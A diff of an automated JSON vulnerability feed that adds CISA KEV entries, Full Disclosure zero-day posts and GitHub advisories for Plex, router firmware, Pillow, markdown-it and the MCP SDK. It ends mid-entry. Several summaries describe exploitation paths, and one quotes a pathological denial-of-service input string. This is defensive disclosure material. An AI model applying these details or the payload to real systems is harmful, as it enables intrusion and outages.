@@ -1,10 +1,124 @@
 {
-  "generated": "2026-10-20T15:56:26.956612+00:00",
-  "total": 16,
-  "kev": 0,
-  "zero_day": 9,
+  "generated": "2026-10-20T20:58:06.587980+00:00",
+  "total": 40,
+  "kev": 6,
+  "zero_day": 16,
   "enriched": 0,
   "findings": [
+    {
+      "id": "CVE-2026-96655",
+      "title": "CVE-2026-96655 \u2014 Plex Media Server Server-Side Request Forgery (SSRF) Vulnerability",
+      "summary": "Vendor: Plex | Product: Media Server. Plex Media Server contains a server-side request forgery (SSRF) vulnerability that could allow an authenticated user to request arbitrary internal or external addresses via the '/video/:/transcode/universal' path parameter. This vulnerability can be chained with CVE-2026-96652, CVE-2026-96654, and CVE-2026-96656. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-11-03)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-96655",
+      "published": "2026-10-20",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-96655"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-96652",
+      "title": "CVE-2026-96652 \u2014 Plex Media Server Server-Side Request Forgery (SSRF) Vulnerability",
+      "summary": "Vendor: Plex | Product: Media Server. Plex Media Server contains a server-side request forgery (SSRF) vulnerability which could allow an attacker using any X-Plex-Token value to include a full URL in the 'protocol' parameter and force the Plex server to POST to the attacker's chosen destination. This vulnerability can be chained with CVE-2026-96654, CVE-2026-96655, and CVE-2026-96656.  Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-11-03)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-96652",
+      "published": "2026-10-20",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-96652"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-106931",
+      "title": "CVE-2026-106931 \u2014 EG Secure Solutions SiteGuard Server Edition OS Command Injection Vulnerability",
+      "summary": "Vendor: EG Secure Solutions | Product: SiteGuard Server Edition. EG Secure Solutions SiteGuard Server Edition contains an OS command injection vulnerability which may allow an attacker to execute arbitrary OS commands with root or SYSTEM privileges on the system running the affected product. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-10-23)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-106931",
+      "published": "2026-10-20",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-106931"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-96656",
+      "title": "CVE-2026-96656 \u2014 Plex Media Server External Control of File Name or Path Vulnerability",
+      "summary": "Vendor: Plex | Product: Media Server. Plex Media Server contains an external control of file name or path vulnerability which can allow an admin user to write arbitrary files that may be executed on load. This vulnerability can be chained with CVE-2026-96652, CVE-2026-96654, and CVE-2026-96655. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-10-23)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-96656",
+      "published": "2026-10-20",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-96656"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-96654",
+      "title": "CVE-2026-96654 \u2014 Plex Media Server Improper Neutralization of Encoded URI Schemes in a Web Page Vulnerability",
+      "summary": "Vendor: Plex | Product: Media Server. Plex Media Server contains an improper neutralization of encoded URI schemes in a web page vulnerability that could allow an attacker to call other plugins' functions and supply their own parameters. This vulnerability can be chained with CVE-2026-96652, CVE-2026-96655, and CVE-2026-96656. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-10-23)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-96654",
+      "published": "2026-10-20",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-96654"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-110936",
+      "title": "CVE-2026-110936 \u2014 Siemens Software Center Uncontrolled Search Path Element Vulnerability",
+      "summary": "Vendor: Siemens | Product: Software Center. Siemens Software Center contains an uncontrolled search path element vulnerability that could allow an authenticated local attacker to place a specially crafted DLL in a directory that the application searches, leading to arbitrary code execution with the privileges of the affected application. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-11-03)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-110936",
+      "published": "2026-10-20",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-110936"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -149,6 +263,111 @@
       "is_high_severity": false
     },
     {
+      "id": "https://seclists.org/fulldisclosure/2026/Oct/34",
+      "title": "[0day-rubbish] TRENDnet TV-IP302PI firmware 1.02.38 authenticated NTP server-address OS command injection to root command execution via a shell-form system() call (7.2 High, PR:H)",
+      "summary": "Posted by disclosure via Fulldisclosure on Oct 20 0day Rubbish Research Team is publicly disclosing a vulnerability in TRENDnet TV-IP302PI firmware 1.02.38, the closed-source IP surveillance camera from TRENDnet (United States). The camera's application daemon is shipped at /hunt/hunt_server: an ARM 32-bit EABI5 version 5TE soft-float binary, dynamically linked against /lib/ld-linux.so.3, 4.5 MB and stripped. Its own string pool carries hunt_camera, HuntAudioConverter, HuntDataDirect and...",
+      "link": "https://seclists.org/fulldisclosure/2026/Oct/34",
+      "published": "2026-10-20T18:50:07+00:00",
+      "source": "Full Disclosure",
+      "tags": [
+        "disclosure",
+        "exploit"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "https://seclists.org/fulldisclosure/2026/Oct/33",
+      "title": "[0day-rubbish] Royal Render 9.1.26b: default-unauthenticated job submission on rrServer TCP 7773 reaches worker-side shell execution as the worker identity, measured root (8.1 High)",
+      "summary": "Posted by disclosure via Fulldisclosure on Oct 20 0day Rubbish Research Team is publicly disclosing a vulnerability in Royal Render 9.1.26b, the closed-source render-farm job manager for VFX and animation studios from Binary Alchemy (proprietor Holger Schoenberger) of Ludwigsburg, Germany. Royal Render is a different product from the Royal Server gateway sold by Royal Apps GmbH of Austria; the two are unrelated companies sharing one word in their names, and this disclosure concerns the German...",
+      "link": "https://seclists.org/fulldisclosure/2026/Oct/33",
+      "published": "2026-10-20T18:50:06+00:00",
+      "source": "Full Disclosure",
+      "tags": [
+        "disclosure",
+        "exploit"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "https://seclists.org/fulldisclosure/2026/Oct/32",
+      "title": "[0day-rubbish] ProSoft Technology RLX-IFH24E v2.2.44 unsigned firmware upgrade package to root command execution and full account-database overwrite (7.2)",
+      "summary": "Posted by disclosure via Fulldisclosure on Oct 20 0day Rubbish Research Team is publicly disclosing a vulnerability in the ProSoft RLX-IFH24E, version v2.2.44, the industrial wireless radio from ProSoft Technology, Inc. (United States). The appliance is a closed-source embedded device and an OEM build of the MicroHard Systems IPx21 platform on the MHX-910 board design: an Intel IXP425 XScale processor, ARM big-endian, Linux 2.4.24-uc0, with static management pages under /usr/web and 57 ARM...",
+      "link": "https://seclists.org/fulldisclosure/2026/Oct/32",
+      "published": "2026-10-20T18:50:05+00:00",
+      "source": "Full Disclosure",
+      "tags": [
+        "disclosure",
+        "exploit"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "https://seclists.org/fulldisclosure/2026/Oct/31",
+      "title": "[0day-rubbish] Parasoft Continuous Testing Platform 10.7.5-SNAPSHOT anonymous deserialization in the database restore path to JSP command execution as uid=1000 (9.8)",
+      "summary": "Posted by disclosure via Fulldisclosure on Oct 20 0day Rubbish Research Team is publicly disclosing a vulnerability in Parasoft Continuous Testing Platform 10.7.5-SNAPSHOT, the closed-source commercial continuous-testing, service-virtualisation and environment-management product from Parasoft, a United States software-testing vendor headquartered in Monrovia, California. The affected component is the em web application inside the vendor's own container image, running on Tomcat 10.1.57 with...",
+      "link": "https://seclists.org/fulldisclosure/2026/Oct/31",
+      "published": "2026-10-20T18:50:03+00:00",
+      "source": "Full Disclosure",
+      "tags": [
+        "disclosure",
+        "exploit"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "https://seclists.org/fulldisclosure/2026/Oct/30",
+      "title": "[0day-rubbish] Exasol Database 7.1.30 docker-db form: shipped default SYS credential to PYTHON3 UDF os.popen command execution as uid=500(exadefusr), output returned in-band (8.8)",
+      "summary": "Posted by disclosure via Fulldisclosure on Oct 20 0day Rubbish Research Team is publicly disclosing a vulnerability in Exasol Database 7.1.30, the in-memory MPP analytical database from Exasol AG (Germany), examined in its docker-db single-container deployment form. The SQL engine is a proprietary C implementation named EXASolution, the server process is exacts, clients speak a proprietary binary SQL protocol on port 8563 rather than HTTP, TLS terminates on that port with a self-signed...",
+      "link": "https://seclists.org/fulldisclosure/2026/Oct/30",
+      "published": "2026-10-20T18:50:02+00:00",
+      "source": "Full Disclosure",
+      "tags": [
+        "disclosure",
+        "exploit"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "https://seclists.org/fulldisclosure/2026/Oct/29",
+      "title": "[0day-rubbish] Edimax BR-6478AC firmware v2.20 authenticated command injection in the setWAN WAN-configuration handler, root command execution (7.2)",
+      "summary": "Posted by disclosure via Fulldisclosure on Oct 20 0day Rubbish Research Team is publicly disclosing a vulnerability in the Edimax BR-6478AC, firmware image BR6478AC_v2.20.bin, the dual-band AC1750 SOHO wireless router from Edimax Technology Co., Ltd. (Taiwan). A single authenticated POST that looks like an ordinary WAN settings submission reaches system() with a request-controlled username interpolated unquoted into a shell command line, behind a sanitiser that inspects exactly one character,...",
+      "link": "https://seclists.org/fulldisclosure/2026/Oct/29",
+      "published": "2026-10-20T18:50:00+00:00",
+      "source": "Full Disclosure",
+      "tags": [
+        "disclosure",
+        "exploit"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "https://seclists.org/fulldisclosure/2026/Oct/28",
+      "title": "[0day-rubbish] Edimax BR-6478AC firmware v2.20 authenticated command injection in the formWlanMP manufacturing-test handler, root command execution (7.2)",
+      "summary": "Posted by disclosure via Fulldisclosure on Oct 20 0day Rubbish Research Team is publicly disclosing a vulnerability in the Edimax BR-6478AC, firmware image BR6478AC_v2.20.bin, the dual-band AC1750 SOHO wireless router from Edimax Technology Co., Ltd. (Taiwan). A single authenticated POST to a manufacturing radio-calibration route that is still registered in production firmware reaches system() with thirty raw request fields interpolated into one command line, and the web server process that...",
+      "link": "https://seclists.org/fulldisclosure/2026/Oct/28",
+      "published": "2026-10-20T18:49:59+00:00",
+      "source": "Full Disclosure",
+      "tags": [
+        "disclosure",
+        "exploit"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-281a",
       "title": "Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data",
       "summary": "Advisory at a Glance Title Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data Original Publication October 8, 2026 Executive Summary Chinese government-linked cyber threat actors, enabled by the Integrity Technology Group, are combining automated scanning tools, large-scale botnets, and hands-on exploitation techniques to target and steal sensitive data from organizations worldwide, including US critical infrastructure sectors. These actors exploit vulnerabilities by using scanning tools, cross-site scripting attacks, and password spraying on Microsoft Exchange servers, while establishing persistence through VPN software and exfiltrating emails and credentials using scripts. To help mitigate against this activity, organizations should prioritize disabling unused services and ports, sanitizing web application inputs to prevent injection attacks, implementing multifactor authentication for all services, and applying timely patches to reduce risks of compromise. Affected Products CVE-2014-6278 CVE-2015-3306 CVE-2015-5477 CVE-2016-3081 CVE-2019-11510 CVE-2021-22205 CVE-2021-3199 CVE-2023-22894 Key Actions Disable unused services and ports , such as automatic configuration, remote access, or file sharing protocols. Sanitize user input in web applications to prevent possible cross-site scripting (XSS) payload injection. Implement identity, credential, and access management (ICAM) policies , and then require multifactor authentication (MFA) for services (to the extent possible). Indicators of Compromise For a downloadable copy of indicators of compromise, see: AA26-281A STIX XML AA26-281A STIX JSON Intended Audience Organizations: Government; Federal Civilian Executive Branch (FCEB); State, Local, Tribal, and Territorial (SLTT); Critical Infrastructure. Sectors: Government Services and Facilities , Critical Manufacturing , Healthcare and Public Health , and Information Technology . Roles: Defensive Cybersecuri",
@@ -173,6 +392,278 @@
       "is_high_severity": true
     },
     {
+      "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-293a",
+      "title": "#StopRansomware: SafePay Ransomware",
+      "summary": "Advisory at a Glance Title #StopRansomware: SafePay Ransomware Original Publication October 20, 2026 Executive Summary This advisory details recent activity by the SafePay ransomware group. SafePay actors have been highly active since August 2024, targeting businesses and critical infrastructure across North America, South America, Europe, and Australia. SafePay actors typically gain access to networks by stealing or guessing passwords, exploiting vulnerabilities in security systems, and using phishing tactics. Once inside the network, SafePay actors establish control by creating new accounts or taking over existing ones. They then use legitimate system tools to move through the network, identify valuable files, and disable security protections to avoid detection. Following, they encrypt the victim\u2019s files, making them inaccessible, and leave a ransom note demanding payment in cryptocurrency. This advisory urges organizations to follow recommended security measures to reduce the risk and impact of SafePay ransomware attacks. Affected Products CVE-2020-3259 [ Common Weakness Enumeration (CWE)-200: Exposure of Sensitive Information to an Unauthorized Actor ] CVE-2023-20269 [ CWE-288: Authentication Bypass Using an Alternate Path or Channel ] CVE-2023-27532 [ CWE-306: Missing Authentication for Critical Function ] CVE-2024-40711 [ CWE-502: Deserialization of Untrusted Data ] CVE-2024-40766 [ CWE-284: Improper Access Control ] Key Actions Regularly patch and update systems, especially firewalls, and other edge devices. Implement Zero Trust Principle. Restrict administrative tools and privileges to necessary users only. Strengthen account security by implementing identity, credential, and access management (ICAM) policies and multifactor authentication (MFA). Indicators of Compromise For a downloadable copy of indicators of compromise, see: AA26-293A STIX XML (40 KB) AA26-293A STIX JSON (38 KB) Intended Audience Organizations: Government; Federal Civilian Executive Branc",
+      "link": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-293a",
+      "published": "Mon, 19 Oct 2026 15:18:07 EDT",
+      "source": "CISA US-CERT Alerts",
+      "tags": [
+        "cisa",
+        "ics"
+      ],
+      "cve_ids": [
+        "CVE-2020-3259",
+        "CVE-2023-20269",
+        "CVE-2023-27532",
+        "CVE-2024-40711",
+        "CVE-2024-40766"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-112404",
+      "title": "Pillow: OOB read in TiffDecode.c tile and RGBA paths leaks heap memory into pixels",
+      "summary": "```\n============================================================================\nOOB read in TiffDecode.c tile and RGBA paths leaks heap memory into pixels\nLocation: src/libImaging/TiffDecode.c:483  in _decodeTile()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nPillow reads past the end of a heap buffer when decoding certain malformed compressed TIFF files, and copies the bytes it reads into the pixels of the image it returns. An attacker who can get an application to open and load an image file, for example by uploading it to a service that returns thumbnails, previews or converted images, gets back fragments of that process's heap memory, including pointer values. A slightly larger file instead crashes the process. No special settings are needed, and nothing is written out of bounds.\n\nThe bug is in `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c`. Both size their decode buffer from libtiff's view of the pixel layout (`TIFFTileSize()`/`TIFFTileRowSize()`, or `img.width * 4`). They then unpack each row with the unpacker that `TiffImagePlugin._setup()` chose from Pillow's own parse of the directory, and neither checks that the unpacker's input row fits inside the row libtiff produced. `_decodeStrip()` has exactly this check, added for OSS-Fuzz `crash-0da0` in 8.2.0, but the tile and RGBA paths never got it.\n\nThe two parsers can be made to disagree with a duplicated `PhotometricInterpretation` or `BitsPerSample` tag, because libtiff keeps the first occurrence and Pillow keeps the last. Pillow then unpacks 4 to 8 bytes per pixel from rows that libtiff filled with 1 to 4 bytes, so the last rows of each tile are read from beyond the buffer. The disclosed memory is a few tile rows past the buffer, and the attacker chooses the tile width. The amount does not grow with the number of tiles, because the buffer is reused for every tile.\n\nThe tile half was introduced in ",
+      "link": "https://github.com/advisories/GHSA-c6hw-5grf-ff96",
+      "published": "2026-10-20T20:42:00Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-112404"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111758",
+      "title": "markdown-it: Quadratic-time rendering of a single multi-line link reference definition with default options (regression since 14.0)",
+      "summary": "### Summary\n\nA link reference definition whose label or title is never closed is O(n\u00b2) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4\u20135\u00d7 per doubling. No options are required to trigger it.\n\n### Details\n\nsrc/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n\u00b2). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark \u00a76.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.\n\nThe observed output from PoC was:\nunclosed title n=100000   200009 B    3585.5 ms\nunclosed title n=200000   400009 B   18107.1 ms",
+      "link": "https://github.com/advisories/GHSA-gfr2-rv44-r23c",
+      "published": "2026-10-20T20:28:44Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111758"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111766",
+      "title": "markdown-it: Quadratic-time denial of service in inline HTML parsing with html enabled",
+      "summary": "### Summary\n\nWith `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`<!--`), processing instructions (`<?`), declarations (`<!A`), and CDATA sections (`<![CDATA[`).\n\nAn attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\nThe issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\n### Details\n\n`src/rules_inline/text.ts` treats `<` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\nWith HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\n```js\nconst match = state.src.slice(pos).match(HTML_TAG_RE)\n```\n\nThe comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `-->`, `?>`, `>`, and `]]>`.\n\nWhen the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\nThe payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.\n\nThe existing `unclosed <!--` test in `test/markdown-it/pathological.test.mjs` already contains a reproducer:\n\n```js\n'</' + '<!--'.repeat(100000)\n```\n\nHowever, it runs with default options, where HTML is disabled.\n\nA fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by c",
+      "link": "https://github.com/advisories/GHSA-vfgh-jcmw-g37q",
+      "published": "2026-10-20T20:08:19Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111766"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111770",
+      "title": "MCP  TypeScript server SDK: Shared transport or server instances delivered one HTTP client's messages to another",
+      "summary": "### Summary\nIn affected versions, an MCP server reached over HTTP could deliver one client's responses and notifications to another client. This happened when clients shared one stateless transport, or one `McpServer` or `Server` instance.\n\nMessages were matched to a connection by JSON-RPC `id` alone. SDK clients number requests from 0, so ids collide in normal use.\n\n### Am I affected?\nYes, if more than one client can reach your HTTP endpoint and your code creates the transport or the server once at startup, instead of once per request or per session. Until this release, the README examples of `@modelcontextprotocol/hono`, `express`, `fastify` and `node` showed that pattern.\n\nAffected versions: `@modelcontextprotocol/server` 2.0.0 through 2.2.0.\n\nNot affected:\n\n- `createMcpHandler()` with a factory that builds a new server on every call\n- stdio servers\n- `@modelcontextprotocol/sdk` 1.26.0 and later\n\n### Fix\nUpgrade to `@modelcontextprotocol/server` 2.3.0 or later.\n\n**You also need to change your code.** The SDK now refuses to be shared, so an affected app fails requests after upgrading: a second `connect()` rejects with `ALREADY_CONNECTED`, and a stateless transport rejects its second request.\n\nChange to one of these:\n\n- **`createMcpHandler()`:** pass a factory that builds a new `McpServer` on every call.\n- **Per request:** build a new `McpServer` and a new transport inside the request handler.\n- **Per session:** set `sessionIdGenerator` and keep one `McpServer` and one transport per session.\n\nIf you cannot upgrade yet, the same change fixes affected versions.",
+      "link": "https://github.com/advisories/GHSA-jm63-cq47-j5jp",
+      "published": "2026-10-20T20:07:29Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111770"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111771",
+      "title": "MCP TypeScript SDK: Server bearer authentication accepted tokens issued for another service",
+      "summary": "### Summary\nIn affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.\n\n### Am I affected?\nYes, if your HTTP server uses `requireBearerAuth()` or `verifyBearerToken()`, its authorization server also issues tokens for other services, and your `verifyAccessToken()` does not check the token's audience (`aud`) itself.\n\nAffected versions:\n\n- `@modelcontextprotocol/sdk` 1.6.0 through 1.31.0\n- `@modelcontextprotocol/server` 2.0.0 through 2.2.0\n- `@modelcontextprotocol/express` 2.0.0 through 2.0.1\n- `@modelcontextprotocol/server-legacy` 2.0.0 through 2.3.0\n\n### Fix\nUpgrade to:\n\n- 1.x: `@modelcontextprotocol/sdk` 1.32.0 or later\n- 2.x: `@modelcontextprotocol/server` 2.3.0 or later, together with `@modelcontextprotocol/express` 2.0.2 or later if you use it\n- `@modelcontextprotocol/server-legacy` 2.3.1 or later\n\n**Upgrading alone changes nothing.** The patched versions add an `expectedResource` setting that is off by default. To turn the check on, make both of these changes together:\n\n1. Pass the audience your authorization server puts in tokens for your server: `requireBearerAuth({ verifier, expectedResource: new URL('https://mcp.example.com/mcp') })`.\n2. Return the token's audience from `verifyAccessToken()` as `AuthInfo.resource`, also a `URL`.\n\nA token for another service then gets `401`. With only the first change, every request gets `401`.\n\nIf you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verifyAccessToken()`. That closes the issue on every version.",
+      "link": "https://github.com/advisories/GHSA-rvq5-wwqv-78pq",
+      "published": "2026-10-20T19:43:36Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111771"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-111769",
+      "title": "MCP TypeScript client SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies",
+      "summary": "### Summary\nIn affected versions, the SDK's HTTP client transports and OAuth requests followed redirects to any origin.\n\nIf an MCP server or authorization server redirected a request to another origin, that origin received custom request headers (such as an `X-API-Key` set in `requestInit.headers`) and the `mcp-session-id` header. On a `307` or `308` it also received the request body, including OAuth token requests with their `refresh_token` and `client_secret`.\n\nOn current runtimes `fetch` already drops the `Authorization` header across origins.\n\n### Am I affected?\nYes, if your application uses `StreamableHTTPClientTransport`, `SSEClientTransport`, or the SDK's OAuth client functions such as `auth()`. stdio clients are not affected.\n\nAffected versions:\n\n- `@modelcontextprotocol/sdk` all versions through 1.31.0\n- `@modelcontextprotocol/client` 2.0.0 through 2.2.0\n\n### Fix\nUpgrade to:\n\n- 1.x: `@modelcontextprotocol/sdk` 1.32.0 or later\n- 2.x: `@modelcontextprotocol/client` 2.3.0 or later\n\nRedirects are now followed only within the same origin, and not at all in browsers. If your MCP server or authorization server redirects to another origin on purpose, configure the final URL instead. Setting `redirectPolicy: 'follow'` on a transport restores the old behaviour and the exposure.\n\nIf a redirect may have reached a host you do not control, rotate the API keys and `client_secret` your application held and revoke its tokens.\n\nIf you cannot upgrade yet, pass a `fetch` that refuses redirects, for example `(url, init) => fetch(url, { ...init, redirect: 'error' })`.",
+      "link": "https://github.com/advisories/GHSA-6prh-2h8m-c8cw",
+      "published": "2026-10-20T18:26:30Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-111769"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-113652",
+      "title": "ApostropheCMS uploadfs Azure backend leaks account-level SAS token into every public attachment URL (sas: true)",
